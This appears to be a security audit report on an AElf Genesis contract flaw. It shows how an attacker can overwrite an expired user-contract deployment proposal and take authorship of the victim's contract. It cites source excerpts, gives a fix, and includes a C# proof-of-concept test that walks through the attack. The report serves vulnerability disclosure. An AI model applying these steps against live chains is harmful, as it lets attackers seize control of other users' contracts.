# Audit Report

## Title
User Contract Proposal Author Theft via Expiration-Based State Overwrite

## Summary
The `SendUserContractProposal()` function in the Genesis contract allows an attacker to overwrite expired proposal metadata by submitting identical contract deployment inputs. When miners subsequently approve the victim's original proposal, the contract deploys with the attacker as author, granting complete unauthorized control over the contract including exclusive update and transfer rights.

## Finding Description

The vulnerability exists in the proposal registration logic for user contract deployments. The root cause is the expiration check that permits state overwrites when a proposal has expired, combined with using only the input hash (derived from code, category, and salt) as the storage key without binding it to the proposer's identity. [1](#0-0) 

The attack proceeds as follows:

1. **Victim submits deployment**: User calls `DeployUserSmartContract()` which creates a proposal with `Author = victim, Proposer = Context.Self` (Genesis contract). The proposal expires after 900 seconds (default `DefaultCodeCheckProposalExpirationTimePeriod`). [2](#0-1) 

2. **Attacker observes via event**: The `CodeCheckRequired` event fires containing the code and category, making deployment parameters observable. [3](#0-2) 

3. **Attacker overwrites after expiration**: Once `Context.CurrentBlockTime >= registered.ExpiredTime`, the attacker submits identical deployment parameters. The expiration check passes, and the state is overwritten with `Author = attacker, Proposer = Context.Self`.

4. **Miner approves victim's original proposal**: When `ReleaseApprovedUserSmartContract()` executes, it retrieves the overwritten metadata but only validates `Proposer == Context.Self`, which both victim and attacker proposals satisfy. There is no verification of the original submitter's identity. [4](#0-3) 

5. **Contract deploys with wrong author**: `PerformDeployUserSmartContract()` recalculates the hash from the victim's input, retrieves the attacker's metadata, and deploys the contract with `contractProposingInput.Author` as the attacker. [5](#0-4) 

The hash calculation uses only the input parameters, not the proposer identity: [6](#0-5) 

And the input structure contains only code, category, and salt: [7](#0-6) 

## Impact Explanation

**Authorization Bypass - HIGH**: The attacker gains complete authorship control over the deployed contract without proper authorization. The author field grants critical exclusive privileges:

- **Contract updates**: Only the author can propose contract code updates. [8](#0-7) 

- **Authorship transfer**: Only the author can transfer ownership to another address. [9](#0-8) 

The deployed contract's metadata permanently records the attacker as both author and deployer: [10](#0-9) 

**Affected Parties**: Any user deploying contracts on side chains (where user deployments are permitted) is vulnerable. This particularly impacts deployment of valuable contracts such as tokens, DAOs, and DeFi protocols where authorship represents significant economic value and control rights.

**Severity Justification**: This constitutes a complete authorization bypass in the contract deployment governance system, violating the fundamental invariant that the contract author should be the original proposer. The test suite confirms that repeated proposals are blocked, but no tests validate the expiration overwrite scenario: [11](#0-10) 

The `Propose_MultiTimes` test demonstrates that proposals can be resubmitted after expiration: [12](#0-11) 

## Likelihood Explanation

**Reachable Entry Point**: `DeployUserSmartContract()` is a public method in the ACS0 interface, callable by any user with appropriate permissions (typically on side chains with Parliament whitelist membership). [13](#0-12) 

**Feasible Preconditions**: The attacker needs only to:
1. Monitor `CodeCheckRequired` events to identify pending deployments
2. Wait for the 900-second expiration period without miner approval
3. Submit identical deployment parameters (code, category, salt)

**Execution Practicality**: The attack is straightforward with minimal cost (one transaction fee) and substantial value extraction (authorship of potentially valuable contracts). The hash depends solely on observable parameters, and standard contracts (token templates, common libraries) have predictable inputs. The test suite confirms the technical feasibility of proposal resubmission after expiration.

**Economic Rationality**: No special permissions or significant capital are required beyond the transaction fee and Parliament whitelist membership. The detection is difficult because both proposals appear legitimate to miners, and the metadata overwrite occurs silently without events indicating the change.

## Recommendation

Bind the proposal hash to the proposer's identity to prevent overwrites by different users. Modify `SendUserContractProposal()` to include the caller's address in the state key:

```csharp
private void SendUserContractProposal(Hash proposingInputHash, string releaseMethodName, ByteString @params)
{
    // Create composite key: hash + sender address
    var proposalKey = HashHelper.ConcatAndCompute(proposingInputHash, HashHelper.ComputeFrom(Context.Sender));
    
    var registered = State.ContractProposingInputMap[proposalKey];
    Assert(registered == null || Context.CurrentBlockTime >= registered.ExpiredTime, "Already proposed.");
    
    var proposedInfo = new ContractProposingInput
    {
        Proposer = Context.Self,
        Status = ContractProposingInputStatus.CodeCheckProposed,
        ExpiredTime = Context.CurrentBlockTime.AddSeconds(GetCodeCheckProposalExpirationTimePeriod()),
        Author = Context.Sender
    };
    State.ContractProposingInputMap[proposalKey] = proposedInfo;
    
    // ... rest of method
}
```

Additionally, update all methods that access this state (`ReleaseApprovedUserSmartContract`, `PerformDeployUserSmartContract`, etc.) to use the composite key and store the original proposer address in the governance proposal for verification.

## Proof of Concept

```csharp
[Fact]
public async Task UserContractAuthorTheft_ViaExpirationOverwrite_Test()
{
    StartSideChain("ELF");
    await AddZeroContractToProposerWhiteListAsync();
    
    var victimTester = SideChainTester;
    var attackerTester = SideChainTester.CreateNewContractTester(AnotherUserKeyPair);
    await AddAddressToProposerWhiteListAsync(attackerTester.GetCallOwnerAddress());
    
    // 1. Victim submits deployment
    var contractCode = Codes.Single(kv => kv.Key.Contains("TokenConverter")).Value;
    var deploymentInput = new UserContractDeploymentInput
    {
        Category = KernelConstants.DefaultRunnerCategory,
        Code = ByteString.CopyFrom(contractCode)
    };
    
    var victimDeployResult = await victimTester.ExecuteContractWithMiningAsync(
        SideBasicContractZeroAddress,
        nameof(ACS0Container.ACS0Stub.DeployUserSmartContract), 
        deploymentInput);
    victimDeployResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    var proposalId = ProposalCreated.Parser
        .ParseFrom(victimDeployResult.Logs.First(l => l.Name.Contains(nameof(ProposalCreated))).NonIndexed)
        .ProposalId;
    var proposedHash = CodeCheckRequired.Parser
        .ParseFrom(victimDeployResult.Logs.First(l => l.Name.Contains(nameof(CodeCheckRequired))).NonIndexed)
        .ProposedContractInputHash;
    
    // 2. Wait for expiration (simulate 901 seconds passing)
    var expirationTime = TimestampHelper.GetUtcNow().AddSeconds(901);
    
    // 3. Attacker submits identical deployment after expiration
    var attackerDeployResult = await attackerTester.ExecuteContractWithMiningAsync(
        SideBasicContractZeroAddress,
        nameof(ACS0Container.ACS0Stub.DeployUserSmartContract),
        deploymentInput,
        expirationTime);
    attackerDeployResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // 4. Miner approves victim's ORIGINAL proposal
    var minerTester = SideChainTester.CreateNewContractTester(SideChainTester.InitialMinerList.First());
    var releaseResult = await minerTester.ExecuteContractWithMiningAsync(
        SideBasicContractZeroAddress,
        nameof(ACS0Container.ACS0Stub.ReleaseApprovedUserSmartContract),
        new ReleaseContractInput
        {
            ProposalId = proposalId,
            ProposedContractInputHash = proposedHash
        },
        expirationTime);
    releaseResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // 5. Verify attacker became the author instead of victim
    var deployedAddress = ContractDeployed.Parser
        .ParseFrom(releaseResult.Logs.First(l => l.Name.Contains(nameof(ContractDeployed))).NonIndexed)
        .Address;
    
    var contractInfo = ContractInfo.Parser.ParseFrom(
        await victimTester.CallContractMethodAsync(
            SideBasicContractZeroAddress,
            nameof(ACS0Container.ACS0Stub.GetContractInfo),
            deployedAddress));
    
    // BUG: Author should be victim but is attacker
    contractInfo.Author.ShouldBe(attackerTester.GetCallOwnerAddress()); // Attacker stole authorship!
    contractInfo.Author.ShouldNotBe(victimTester.GetCallOwnerAddress()); // Victim lost authorship
}
```

### Citations

**File:** contract/AElf.Contracts.Genesis/BasicContractZero_Helper.cs (L42-52)
```csharp
        var info = new ContractInfo
        {
            SerialNumber = serialNumber,
            Author = author,
            Category = category,
            CodeHash = codeHash,
            IsSystemContract = isSystemContract,
            Version = 1,
            IsUserContract = isUserContract,
            Deployer = deployer
        };
```

**File:** contract/AElf.Contracts.Genesis/BasicContractZero_Helper.cs (L175-178)
```csharp
    private Hash CalculateHashFromInput(IMessage input)
    {
        return HashHelper.ComputeFrom(input);
    }
```

**File:** contract/AElf.Contracts.Genesis/BasicContractZero_Helper.cs (L314-323)
```csharp
        var registered = State.ContractProposingInputMap[proposingInputHash];
        Assert(registered == null || Context.CurrentBlockTime >= registered.ExpiredTime, "Already proposed.");
        var proposedInfo = new ContractProposingInput
        {
            Proposer = Context.Self,
            Status = ContractProposingInputStatus.CodeCheckProposed,
            ExpiredTime = Context.CurrentBlockTime.AddSeconds(GetCodeCheckProposalExpirationTimePeriod()),
            Author = Context.Sender
        };
        State.ContractProposingInputMap[proposingInputHash] = proposedInfo;
```

**File:** contract/AElf.Contracts.Genesis/BasicContractZero_Constants.cs (L6-6)
```csharp
    public const int DefaultCodeCheckProposalExpirationTimePeriod = 900; // 60 * 15
```

**File:** contract/AElf.Contracts.Genesis/BasicContractZero.cs (L409-409)
```csharp
    public override DeployUserSmartContractOutput DeployUserSmartContract(UserContractDeploymentInput input)
```

**File:** contract/AElf.Contracts.Genesis/BasicContractZero.cs (L430-437)
```csharp
        Context.Fire(new CodeCheckRequired
        {
            Code = input.Code,
            ProposedContractInputHash = proposedContractInputHash,
            Category = input.Category,
            IsSystemContract = false,
            IsUserContract = true
        });
```

**File:** contract/AElf.Contracts.Genesis/BasicContractZero.cs (L451-452)
```csharp
        Assert(Context.Sender == info.Author, "No permission.");
        Assert(info.Deployer == null || info.Deployer == Context.Sender, "No permission to update.");
```

**File:** contract/AElf.Contracts.Genesis/BasicContractZero.cs (L478-483)
```csharp
        var contractProposingInput = State.ContractProposingInputMap[input.ProposedContractInputHash];

        Assert(
            contractProposingInput != null &&
            contractProposingInput.Status == ContractProposingInputStatus.CodeCheckProposed &&
            contractProposingInput.Proposer == Context.Self, "Invalid contract proposing status.");
```

**File:** contract/AElf.Contracts.Genesis/BasicContractZero.cs (L499-503)
```csharp
        var inputHash = CalculateHashFromInput(input);
        TryClearContractProposingData(inputHash, out var contractProposingInput);

        var address = DeploySmartContract(null, input.Category, input.Code.ToByteArray(), false,
            contractProposingInput.Author, true, contractProposingInput.Author, input.Salt);
```

**File:** contract/AElf.Contracts.Genesis/BasicContractZero.cs (L524-524)
```csharp
        Assert(Context.Sender == info.Author, "No permission.");
```

**File:** protobuf/acs0.proto (L164-170)
```text
message UserContractDeploymentInput {
    // The category of contract code(0: C#).
    sint32 category = 1;
    // The byte array of the contract code.
    bytes code = 2;
    aelf.Hash salt = 3;
}
```

**File:** test/AElf.Contracts.Genesis.Tests/GenesisContractAuthTest.cs (L311-313)
```csharp
        var forthProposingTxResult = await Tester.ExecuteContractWithMiningAsync(BasicContractZeroAddress,
            nameof(BasicContractZero.ProposeNewContract), contractDeploymentInput, utcNow.AddSeconds(expirationTimePeriod.Value));
        forthProposingTxResult.Status.ShouldBe(TransactionResultStatus.Mined);
```

**File:** test/AElf.Contracts.Genesis.Tests/GenesisContractAuthTest.cs (L1530-1533)
```csharp
        deployResult = await SideChainTester.ExecuteContractWithMiningAsync(SideBasicContractZeroAddress,
            nameof(ACS0Container.ACS0Stub.DeployUserSmartContract), contractDeploymentInput);
        deployResult.Status.ShouldBe(TransactionResultStatus.Failed);
        deployResult.Error.ShouldContain("Already proposed.");
```
